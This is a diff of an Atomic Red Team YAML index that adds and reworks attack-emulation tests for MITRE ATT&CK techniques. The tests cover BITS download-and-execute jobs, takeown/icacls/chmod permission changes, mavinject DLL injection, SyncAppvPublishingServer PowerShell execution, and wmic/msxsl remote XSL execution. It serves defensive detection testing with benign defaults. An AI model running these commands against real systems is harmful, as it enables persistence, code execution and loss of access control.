@@ -651,10 +651,19 @@ persistence:
         and execute a payload
       supported_platforms:
       - windows
+      input_arguments:
+        remote_file:
+          description: Remote file to download
+          type: url
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
+        local_file:
+          description: Local file path to save downloaded file
+          type: path
+          default: C:\Windows\Temp\bitsadmin_flag.ps1
       executor:
         name: command_prompt
-        command: 'bitsadmin.exe  /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
-          %TEMP%\bitsadmin_flag.ps1
+        command: 'bitsadmin.exe  /transfer /Download /priority Foreground #{remote_file}
+          #{local_file}
 
 '
     - name: Download & Execute via PowerShell BITS
@@ -663,12 +672,55 @@ persistence:
         and execute a payload leveraging PowerShell
       supported_platforms:
       - windows
+      input_arguments:
+        remote_file:
+          description: Remote file to download
+          type: url
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
+        local_file:
+          description: Local file path to save downloaded file
+          type: path
+          default: C:\Windows\Temp\bitsadmin_flag.ps1
       executor:
         name: powershell
-        command: 'Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
-          -Destination $env:TEMP\AtomicRedTeam\bitsadmin_flag.ps1
+        command: 'Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination
+          #{local_file}
 
 '
+    - name: Persist, Download, & Execute
+      description: "This test simulates an adversary leveraging bitsadmin.exe to schedule
+        a BITS transfer \nand execute a payload in multiple steps. This job will remain
+        in the BITS queue for 90 days by default if not removed.\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        bits_job_name:
+          description: Name of BITS job
+          type: string
+          default: AtomicBITS
+        remote_file:
+          description: Remote file to download
+          type: url
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
+        local_file:
+          description: Local file path to save downloaded file
+          type: path
+          default: C:\Windows\Temp\bitsadmin_flag.ps1
+        command_path:
+          description: Path of command to execute
+          type: path
+          default: C:\Windows\system32\notepad.exe
+        command_line:
+          description: Command line to execute
+          type: string
+          default: notepad.exe C:\Windows\Temp\bitsadmin_flag.ps1
+      executor:
+        name: command_prompt
+        command: |-
+          bitsadmin.exe /create #{bits_job_name}
+          bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}
+          bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} #{command_line}
+          bitsadmin.exe /resume #{bits_job_name}
   T1176:
     technique:
       id: attack-pattern--389735f1-f21c-4208-b8f0-f8031e7169b8
@@ -3748,10 +3800,19 @@ defense-evasion:
         and execute a payload
       supported_platforms:
       - windows
+      input_arguments:
+        remote_file:
+          description: Remote file to download
+          type: url
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
+        local_file:
+          description: Local file path to save downloaded file
+          type: path
+          default: C:\Windows\Temp\bitsadmin_flag.ps1
       executor:
         name: command_prompt
-        command: 'bitsadmin.exe  /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
-          %TEMP%\bitsadmin_flag.ps1
+        command: 'bitsadmin.exe  /transfer /Download /priority Foreground #{remote_file}
+          #{local_file}
 
 '
     - name: Download & Execute via PowerShell BITS
@@ -3760,12 +3821,55 @@ defense-evasion:
         and execute a payload leveraging PowerShell
       supported_platforms:
       - windows
+      input_arguments:
+        remote_file:
+          description: Remote file to download
+          type: url
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
+        local_file:
+          description: Local file path to save downloaded file
+          type: path
+          default: C:\Windows\Temp\bitsadmin_flag.ps1
       executor:
         name: powershell
-        command: 'Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
-          -Destination $env:TEMP\AtomicRedTeam\bitsadmin_flag.ps1
+        command: 'Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination
+          #{local_file}
 
 '
+    - name: Persist, Download, & Execute
+      description: "This test simulates an adversary leveraging bitsadmin.exe to schedule
+        a BITS transfer \nand execute a payload in multiple steps. This job will remain
+        in the BITS queue for 90 days by default if not removed.\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        bits_job_name:
+          description: Name of BITS job
+          type: string
+          default: AtomicBITS
+        remote_file:
+          description: Remote file to download
+          type: url
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
+        local_file:
+          description: Local file path to save downloaded file
+          type: path
+          default: C:\Windows\Temp\bitsadmin_flag.ps1
+        command_path:
+          description: Path of command to execute
+          type: path
+          default: C:\Windows\system32\notepad.exe
+        command_line:
+          description: Command line to execute
+          type: string
+          default: notepad.exe C:\Windows\Temp\bitsadmin_flag.ps1
+      executor:
+        name: command_prompt
+        command: |-
+          bitsadmin.exe /create #{bits_job_name}
+          bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}
+          bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} #{command_line}
+          bitsadmin.exe /resume #{bits_job_name}
   T1009:
     technique:
       id: attack-pattern--519630c5-f03f-4882-825c-3af924935817
@@ -4173,86 +4277,65 @@ defense-evasion:
           history -c
   '':
     technique:
-      id: attack-pattern--ebbe170d-aa74-4946-8511-9921243415a3
+      id: attack-pattern--830c9528-df21-472c-8c14-a036bf17d665
       created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
-      name: XSL Script Processing
+      name: Web Service
       description: |-
-        Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)
+        Adversaries may use an existing, legitimate external Web service as a means for relaying commands to a compromised system.
 
-        Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses. Similar to [Trusted Developer Utilities](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018)
+        These commands may also include pointers to command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.
 
-        Command-line example: (Citation: Penetration Testing Lab MSXSL July 2017)
+        Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.
 
-        * <code>msxsl.exe customers[.]xml script[.]xsl</code>
-
-        Another variation of this technique, dubbed “Squiblytwo”, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file. (Citation: subTee WMIC XSL APR 2018) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1117)/ "Squiblydoo" counterpart, leverages a trusted, built-in Windows tool.
-
-        Command-line examples: (Citation: subTee WMIC XSL APR 2018)
-
-        * Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>
-        * Remote File: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>
+        Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).
       external_references:
-      - external_id: T1220
-        url: https://attack.mitre.org/techniques/T1220
+      - external_id: T1102
+        url: https://attack.mitre.org/techniques/T1102
         source_name: mitre-attack
-      - url: https://docs.microsoft.com/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script
-        description: Wenzel, M. et al. (2017, March 30). XSLT Stylesheet Scripting
-          Using <msxsl:script>. Retrieved July 3, 2018.
-        source_name: Microsoft XSLT Script Mar 2017
-      - url: https://www.microsoft.com/download/details.aspx?id=21714
-        description: Microsoft. (n.d.). Command Line Transformation Utility (msxsl.exe).
-          Retrieved July 3, 2018.
-        source_name: Microsoft msxsl.exe
-      - url: https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/
-        description: netbiosX. (2017, July 6). AppLocker Bypass – MSXSL. Retrieved
-          July 3, 2018.
-        source_name: Penetration Testing Lab MSXSL July 2017
-      - url: https://subt0x11.blogspot.com/2018/04/wmicexe-whitelisting-bypass-hacking.html
-        description: Smith, C. (2018, April 17). WMIC.EXE Whitelisting Bypass - Hacking
-          with Style, Stylesheets. Retrieved July 3, 2018.
-        source_name: subTee WMIC XSL APR 2018
-      - url: https://twitter.com/dez_/status/986614411711442944
-        description: Desimone, J. (2018, April 18). Status Update. Retrieved July
-          3, 2018.
-        source_name: Twitter SquiblyTwo Detection APR 2018
-      - url: https://reaqta.com/2018/03/spear-phishing-campaign-leveraging-msxsl/
-        description: Admin. (2018, March 2). Spear-phishing campaign leveraging on
-          MSXSL. Retrieved July 3, 2018.
-        source_name: Reaqta MSXSL Spearphishing MAR 2018
+      - url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
+        description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
+          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
+        source_name: University of Birmingham C2
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       x_mitre_version: '1.0'
       x_mitre_contributors:
-      - Casey Smith
-      - Praetorian
+      - Anastasios Pingios
       x_mitre_data_sources:
-      - Process monitoring
-      - Process command-line parameters
-      - Process use of network
-      - DLL monitoring
+      - Host network interface
+      - Netflow/Enclave netflow
+      - Network protocol analysis
+      - Packet capture
+      - SSL/TLS inspection
       x_mitre_defense_bypassed:
-      - Anti-virus
-      - Application whitelisting
-      - Digital Certificate Validation
-      x_mitre_detection: |-
-        Use process monitoring to monitor the execution and arguments of msxsl.exe and wmic.exe. Compare recent invocations of these utilities with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity (ex: URL command line arguments, creation of external network connections, loading of DLLs associated with scripting). (Citation: subTee WMIC XSL APR 2018) (Citation: Twitter SquiblyTwo Detection APR 2018) Command arguments used before and after the script invocation may also be useful in determining the origin and purpose of the payload being loaded.
-
-        The presence of msxsl.exe or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.
+      - Binary Analysis
+      - Log analysis
+      - Firewall
+      x_mitre_network_requirements: true
+      x_mitre_detection: 'Host data that can relate unknown or suspicious process
+        activity using a network connection is important to supplement any existing
+        indicators of compromise based on malware command and control signatures and
+        infrastructure or the presence of strong encryption. Packet capture analysis
+        will require SSL/TLS inspection if data is encrypted. Analyze network data
+        for uncommon data flows (e.g., a client sending significantly more data than
+        it receives from a server). User behavior monitoring may help to detect abnormal
+        patterns of activity. Analyze packet contents to detect communications that
+        do not follow the expected protocol behavior for the port that is being used.
+        (Citation: University of Birmingham C2)'
       x_mitre_permissions_required:
       - User
-      x_mitre_remote_support: false
       x_mitre_platforms:
+      - Linux
+      - macOS
       - Windows
-      x_mitre_system_requirements:
-      - Microsoft Core XML Services (MSXML) or access to wmic.exe
       type: attack-pattern
       kill_chain_phases:
+      - phase_name: command-and-control
+        kill_chain_name: mitre-attack
       - phase_name: defense-evasion
         kill_chain_name: mitre-attack
-      - phase_name: execution
-        kill_chain_name: mitre-attack
-      modified: '2018-10-31T13:45:13.024Z'
-      created: '2018-10-17T00:14:20.652Z'
+      modified: '2018-10-17T00:14:20.652Z'
+      created: '2017-05-31T21:31:13.915Z'
     atomic_tests: []
   T1223:
     technique:
@@ -5008,6 +5091,416 @@ defense-evasion:
       executor:
         name: command_prompt
         command: 'wbdadmin delete catalog -quiet
+
+'
+  T1222:
+    technique:
+      id: attack-pattern--65917ae0-b854-4139-83fe-bf2441cf0196
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      name: File Permissions Modification
+      description: |-
+        File permissions are commonly managed by discretionary access control lists (DACLs) specified by the file owner. File DACL implementation may vary by platform, but generally explicitly designate which users/groups can perform which actions (ex: read, write, execute, etc.). (Citation: Microsoft DACL May 2018) (Citation: Microsoft File Rights May 2018) (Citation: Unix File Permissions)
+
+        Adversaries may modify file permissions/attributes to evade intended DACLs. (Citation: Hybrid Analysis Icacls1 June 2018) (Citation: Hybrid Analysis Icacls2 May 2018) Modifications may include changing specific access rights, which may require taking ownership of a file and/or elevated permissions such as Administrator/root depending on the file's existing permissions to enable malicious activity such as modifying, replacing, or deleting specific files. Specific file modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1015), [Logon Scripts](https://attack.mitre.org/techniques/T1037), or tainting/hijacking other instrumental binary/configuration files.
+      external_references:
+      - external_id: T1222
+        url: https://attack.mitre.org/techniques/T1222
+        source_name: mitre-attack
+      - url: https://docs.microsoft.com/windows/desktop/secauthz/dacls-and-aces
+        description: Microsoft. (2018, May 30). DACLs and ACEs. Retrieved August 19,
+          2018.
+        source_name: Microsoft DACL May 2018
+      - url: https://docs.microsoft.com/windows/desktop/fileio/file-security-and-access-rights
+        description: Microsoft. (2018, May 30). File Security and Access Rights. Retrieved
+          August 19, 2018.
+        source_name: Microsoft File Rights May 2018
+      - url: https://www.tutorialspoint.com/unix/unix-file-permission.htm
+        description: Tutorials Point. (n.d.). Unix / Linux - File Permission / Access
+          Modes. Retrieved August 19, 2018.
+        source_name: Unix File Permissions
+      - url: https://www.hybrid-analysis.com/sample/ef0d2628823e8e0a0de3b08b8eacaf41cf284c086a948bdfd67f4e4373c14e4d?environmentId=100
+        description: Hybrid Analysis. (2018, June 12). c9b65b764985dfd7a11d3faf599c56b8.exe.
+          Retrieved August 19, 2018.
+        source_name: Hybrid Analysis Icacls1 June 2018
+      - url: https://www.hybrid-analysis.com/sample/22dab012c3e20e3d9291bce14a2bfc448036d3b966c6e78167f4626f5f9e38d6?environmentId=110
+        description: Hybrid Analysis. (2018, May 30). 2a8efbfadd798f6111340f7c1c956bee.dll.
+          Retrieved August 19, 2018.
+        source_name: Hybrid Analysis Icacls2 May 2018
+      - url: https://docs.microsoft.com/windows-server/administration/windows-commands/icacls
+        description: Plett, C. et al.. (2017, October 17). icacls. Retrieved August
+          19, 2018.
+        source_name: Microsoft icacls OCT 2017
+      - url: https://docs.microsoft.com/windows-server/administration/windows-commands/attrib
+        description: Plett, C. et al.. (2017, October 15). attrib. Retrieved August
+          19, 2018.
+        source_name: Microsoft attrib OCT 2017
+      - url: https://linux.die.net/man/1/chmod
+        description: MacKenzie, D. & Meyering, J. (n.d.). chmod(1) - Linux man page.
+          Retrieved August 19, 2018.
+        source_name: Linux chmod
+      - url: https://linux.die.net/man/1/chown
+        description: MacKenzie, D. & Meyering, J. (n.d.). chown(1) - Linux man page.
+          Retrieved August 19, 2018.
+        source_name: Linux chown
+      - url: https://www.eventtracker.com/tech-articles/monitoring-file-permission-changes-windows-security-log/
+        description: Netsurion. (2014, February 19). Monitoring File Permission Changes
+          with the Windows Security Log. Retrieved August 19, 2018.
+        source_name: EventTracker File Permissions Feb 2014
+      - url: https://docs.microsoft.com/windows-server/administration/windows-commands/takeown
+        description: Plett, C. et al.. (2017, October 15). takeown. Retrieved August
+          19, 2018.
+        source_name: Microsoft takeown OCT 2017
+      - url: https://docs.microsoft.com/powershell/module/microsoft.powershell.security/set-acl
+        description: Microsoft. (n.d.). Set-Acl. Retrieved August 19, 2018.
+        source_name: Microsoft SetAcl
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      x_mitre_contributors:
+      - Jan Miller, CrowdStrike
+      x_mitre_data_sources:
+      - File monitoring
+      - Process monitoring
+      - Process command-line parameters
+      - Windows event logs
+      x_mitre_defense_bypassed:
+      - File system access controls
+      x_mitre_detection: |-
+        Monitor and investigate attempts to modify DACLs and file ownership, such as use of icacls (Citation: Microsoft icacls OCT 2017), takeown (Citation: Microsoft takeown OCT 2017), attrib (Citation: Microsoft attrib OCT 2017), and [PowerShell](https://attack.mitre.org/techniques/T1086) Set-Acl (Citation: Microsoft SetAcl) in Windows and chmod (Citation: Linux chmod)/chown (Citation: Linux chown) in macOS/Linux. Many of these are built-in system utilities and may generate high false positive alerts, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.
+
+        Consider enabling file permission change auditing on folders containing key binary/configuration files. Windows Security Log events (Event ID 4670) are used when DACLs are modified. (Citation: EventTracker File Permissions Feb 2014)
+      x_mitre_platforms:
+      - Linux
+      - Windows
+      - macOS
+      x_mitre_permissions_required:
+      - User
+      - Administrator
+      - SYSTEM
+      - root
+      type: attack-pattern
+      kill_chain_phases:
+      - phase_name: defense-evasion
+        kill_chain_name: mitre-attack
+      modified: '2018-10-31T13:45:13.024Z'
+      created: '2018-10-17T00:14:20.652Z'
+      identifier: T1222
+    atomic_tests:
+    - name: Take ownership using takeown utility
+      description: 'Modifies the filesystem permissions of the specified file or folder
+        to take ownership of the object.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        file_folder_to_own:
+          description: Path of the file or folder for takeown to take ownership.
+          type: path
+          default: C:\AtomicRedTeam\atomics\T1222\T1222.yaml
+      executor:
+        name: command_prompt
+        command: 'takeown.exe /f #{file_folder_to_own}
+
+'
+    - name: Take ownership recursively using takeown utility
+      description: 'Modifies the filesystem permissions of the specified folder to
+        take ownership of it and its contents.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        folder_to_own:
+          description: Path of the folder for takeown to take ownership.
+          type: path
+          default: C:\AtomicRedTeam\atomics\T1222
+      executor:
+        name: command_prompt
+        command: 'takeown.exe /f #{folder_to_own} /r
+
+'
+    - name: cacls - Grant permission to specified user or group
+      description: 'Modifies the filesystem permissions of the specified file or folder
+        to allow the specified user or group Full Control.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        file_or_folder:
+          description: Path of the file or folder to change permissions.
+          type: path
+          default: C:\AtomicRedTeam\atomics\T1222\T1222.yaml
+        user_or_group:
+          description: User or group to allow full control
+          type: string
+          default: Everyone
+      executor:
+        name: command_prompt
+        command: 'cacls.exe #{file_or_folder} /grant #{user_or_group}:F
+
+'
+    - name: cacls - Grant permission to specified user or group recursively
+      description: 'Modifies the filesystem permissions of the specified folder and
+        contents to allow the specified user or group Full Control.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        file_or_folder:
+          description: Path of the file or folder to change permissions.
+          type: path
+          default: C:\AtomicRedTeam\atomics\T1222
+        user_or_group:
+          description: User or group to allow full control
+          type: string
+          default: Everyone
+      executor:
+        name: command_prompt
+        command: 'cacls.exe #{file_or_folder} /grant #{user_or_group}:F /t
+
+'
+    - name: icacls - Grant permission to specified user or group
+      description: 'Modifies the filesystem permissions of the specified file or folder
+        to allow the specified user or group Full Control.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        file_or_folder:
+          description: Path of the file or folder to change permissions.
+          type: path
+          default: C:\AtomicRedTeam\atomics\T1222\T1222.yaml
+        user_or_group:
+          description: User or group to allow full control
+          type: string
+          default: Everyone
+      executor:
+        name: command_prompt
+        command: 'icacls.exe #{file_or_folder} /grant #{user_or_group}:F
+
+'
+    - name: icacls - Grant permission to specified user or group recursively
+      description: 'Modifies the filesystem permissions of the specified folder and
+        contents to allow the specified user or group Full Control.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        file_or_folder:
+          description: Path of the file or folder to change permissions.
+          type: path
+          default: C:\AtomicRedTeam\atomics\T1222
+        user_or_group:
+          description: User or group to allow full control
+          type: string
+          default: Everyone
+      executor:
+        name: command_prompt
+        command: 'icacls.exe #{file_or_folder} /grant #{user_or_group}:F /t
+
+'
+    - name: attrib - Remove read-only attribute
+      description: 'Removes the read-only attribute from a file or folder using the
+        attrib.exe command.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        file_or_folder:
+          description: Path of the file or folder remove attribute.
+          type: path
+          default: C:\AtomicRedTeam\atomics\T1222
+      executor:
+        name: command_prompt
+        command: 'attrib.exe -r #{file_or_folder}
+
+'
+    - name: chmod - Change file or folder mode (numeric mode)
+      description: 'Changes a file or folder''s permissions using chmod and a specified
+        numeric mode.
+
+'
+      supported_platforms:
+      - macos
+      - linux
+      input_arguments:
+        file_or_folder:
+          description: Path of the file or folder
+          type: path
+          default: "/tmp/AtomicRedTeam/atomics/T1222"
+        numeric_mode:
+          description: Specified numeric mode value
+          type: string
+          default: 755
+      executor:
+        name: bash
+        command: 'chmod #{numeric_mode} #{file_or_folder}
+
+'
+    - name: chmod - Change file or folder mode (symbolic mode)
+      description: 'Changes a file or folder''s permissions using chmod and a specified
+        symbolic mode.
+
+'
+      supported_platforms:
+      - macos
+      - linux
+      input_arguments:
+        file_or_folder:
+          description: Path of the file or folder
+          type: path
+          default: "/tmp/AtomicRedTeam/atomics/T1222"
+        symbolic_mode:
+          description: Specified symbolic mode value
+          type: string
+          default: a+w
+      executor:
+        name: bash
+        command: 'chmod #{symbolic_mode} #{file_or_folder}
+
+'
+    - name: chmod - Change file or folder mode (numeric mode) recursively
+      description: 'Changes a file or folder''s permissions recursively using chmod
+        and a specified numeric mode.
+
+'
+      supported_platforms:
+      - macos
+      - linux
+      input_arguments:
+        file_or_folder:
+          description: Path of the file or folder
+          type: path
+          default: "/tmp/AtomicRedTeam/atomics/T1222"
+        numeric_mode:
+          description: Specified numeric mode value
+          type: string
+          default: 755
+      executor:
+        name: bash
+        command: 'chmod #{numeric_mode} #{file_or_folder} -R
+
+'
+    - name: chmod - Change file or folder mode (symbolic mode) recursively
+      description: 'Changes a file or folder''s permissions recursively using chmod
+        and a specified symbolic mode.
+
+'
+      supported_platforms:
+      - macos
+      - linux
+      input_arguments:
+        file_or_folder:
+          description: Path of the file or folder
+          type: path
+          default: "/tmp/AtomicRedTeam/atomics/T1222"
+        symbolic_mode:
+          description: Specified symbolic mode value
+          type: string
+          default: a+w
+      executor:
+        name: bash
+        command: 'chmod #{symbolic_mode} #{file_or_folder} -R
+
+'
+    - name: chown - Change file or folder ownership and group
+      description: 'Changes a file or folder''s ownership and group information using
+        chown.
+
+'
+      supported_platforms:
+      - macos
+      - linux
+      input_arguments:
+        file_or_folder:
+          description: Path of the file or folder
+          type: path
+          default: "/tmp/AtomicRedTeam/atomics/T1222/T1222.yaml"
+        owner:
+          description: Username of desired owner
+          type: string
+          default: root
+        group:
+          description: Group name of desired group
+          type: string
+          default: root
+      executor:
+        name: bash
+        command: 'chown #{owner}:#{group} #{file_or_folder}
+
+'
+    - name: chown - Change file or folder ownership and group recursively
+      description: 'Changes a file or folder''s ownership and group information recursively
+        using chown.
+
+'
+      supported_platforms:
+      - macos
+      - linux
+      input_arguments:
+        file_or_folder:
+          description: Path of the file or folder
+          type: path
+          default: "/tmp/AtomicRedTeam/atomics/T1222"
+        owner:
+          description: Username of desired owner
+          type: string
+          default: root
+        group:
+          description: Group name of desired group
+          type: string
+          default: root
+      executor:
+        name: bash
+        command: 'chown #{owner}:#{group} #{file_or_folder} -R
+
+'
+    - name: chown - Change file or folder mode ownership only
+      description: 'Changes a file or folder''s ownership only using chown.
+
+'
+      supported_platforms:
+      - macos
+      - linux
+      input_arguments:
+        file_or_folder:
+          description: Path of the file or folder
+          type: path
+          default: "/tmp/AtomicRedTeam/atomics/T1222/T1222.yaml"
+        owner:
+          description: Username of desired owner
+          type: string
+          default: root
+      executor:
+        name: bash
+        command: 'chown #{owner} #{file_or_folder}
+
+'
+    - name: chown - Change file or folder ownership recursively
+      description: 'Changes a file or folder''s ownership only recursively using chown.
+
+'
+      supported_platforms:
+      - macos
+      - linux
+      input_arguments:
+        file_or_folder:
+          description: Path of the file or folder
+          type: path
+          default: "/tmp/AtomicRedTeam/atomics/T1222"
+        owner:
+          description: Username of desired owner
+          type: string
+          default: root
+      executor:
+        name: bash
+        command: 'chown #{owner} #{file_or_folder} -R
 
 '
   T1144:
@@ -7532,6 +8025,108 @@ defense-evasion:
           sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"
           chmod +x /tmp/art.sh
           sh /tmp/art.sh
+  T1218:
+    technique:
+      id: attack-pattern--457c7820-d331-465a-915e-42f85500ccc4
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      name: Signed Binary Proxy Execution
+      description: |-
+        Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application whitelisting and signature validation on systems. This technique accounts for proxy execution methods that are not already accounted for within the existing techniques.
+
+        ### Mavinject.exe
+        Mavinject.exe is a Windows utility that allows for code execution. Mavinject can be used to input a DLL into a running process. (Citation: Twitter gN3mes1s Status Update MavInject32)
+
+        <code>"C:\Program Files\Common Files\microsoft shared\ClickToRun\MavInject32.exe" <PID> /INJECTRUNNING <PATH DLL></code>
+        <code>C:\Windows\system32\mavinject.exe <PID> /INJECTRUNNING <PATH DLL></code>
+
+        ### SyncAppvPublishingServer.exe
+        SyncAppvPublishingServer.exe can be used to run powershell scripts without executing powershell.exe. (Citation: Twitter monoxgas Status Update SyncAppvPublishingServer)
+
+        Several others binaries exist that may be used to perform similar behavior. (Citation: GitHub Ultimate AppLocker Bypass List)
+      external_references:
+      - external_id: T1218
+        url: https://attack.mitre.org/techniques/T1218
+        source_name: mitre-attack
+      - url: https://twitter.com/gn3mes1s/status/941315826107510784
+        description: Giuseppe. (2017, December 14). gN3mes1s Status Update. Retrieved
+          April 10, 2018.
+        source_name: Twitter gN3mes1s Status Update MavInject32
+      - url: https://twitter.com/monoxgas/status/895045566090010624
+        description: Landers, N. (2017, August 8). monoxgas Status Update. Retrieved
+          April 10, 2018.
+        source_name: Twitter monoxgas Status Update SyncAppvPublishingServer
+      - url: https://github.com/api0cradle/UltimateAppLockerByPassList
+        description: Moe, O. (2018, March 1). Ultimate AppLocker Bypass List. Retrieved
+          April 10, 2018.
+        source_name: GitHub Ultimate AppLocker Bypass List
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      x_mitre_data_sources:
+      - Process monitoring
+      - Process command-line parameters
+      x_mitre_contributors:
+      - Praetorian
+      x_mitre_defense_bypassed:
+      - Application whitelisting
+      - Digital Certificate Validation
+      x_mitre_detection: Monitor processes and command-line parameters for signed
+        binaries that may be used to proxy execution of malicious files. Correlate
+        activity with other suspicious behavior to reduce false positives that may
+        be due to normal benign use by users and administrators.
+      x_mitre_permissions_required:
+      - User
+      x_mitre_remote_support: false
+      x_mitre_platforms:
+      - Windows
+      type: attack-pattern
+      kill_chain_phases:
+      - phase_name: defense-evasion
+        kill_chain_name: mitre-attack
+      - phase_name: execution
+        kill_chain_name: mitre-attack
+      modified: '2018-10-17T00:14:20.652Z'
+      created: '2018-04-18T17:59:24.739Z'
+      identifier: T1218
+    atomic_tests:
+    - name: mavinject - Inject DLL into running process
+      description: 'Injects arbitrary DLL into running process specified by process
+        ID. Requires Windows 10.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        dll_payload:
+          description: DLL to inject
+          type: Path
+          default: C:\AtomicRedTeam\atomics\T1218\src\x64\T1218.dll
+        process_id:
+          description: PID of process receiving injection
+          type: string
+          default: 1000
+      executor:
+        name: command_prompt
+        command: 'mavinject.exe #{process_id} /INJECTRUNNING #{dll_payload}
+
+'
+    - name: SyncAppvPublishingServer - Execute arbitrary PowerShell code
+      description: 'Executes arbitrary PowerShell code using SyncAppvPublishingServer.exe.
+        Requires Windows 10.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        powershell_code:
+          description: PowerShell code to execute
+          type: string
+          default: Start-Process calc.exe
+      executor:
+        name: command_prompt
+        command: 'SyncAppvPublishingServer.exe "n; #{powershell_code}"
+
+'
   T1216:
     technique:
       id: attack-pattern--f6fe9070-7a65-49ea-ae72-76292f42cebe
@@ -7919,6 +8514,90 @@ defense-evasion:
         command: 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe #{filename}
 
 '
+  T1220:
+    technique:
+      id: attack-pattern--ebbe170d-aa74-4946-8511-9921243415a3
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      name: XSL Script Processing
+      description: |-
+        Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)
+
+        Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses. Similar to [Trusted Developer Utilities](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018)
+
+        Command-line example: (Citation: Penetration Testing Lab MSXSL July 2017)
+
+        * <code>msxsl.exe customers[.]xml script[.]xsl</code>
+
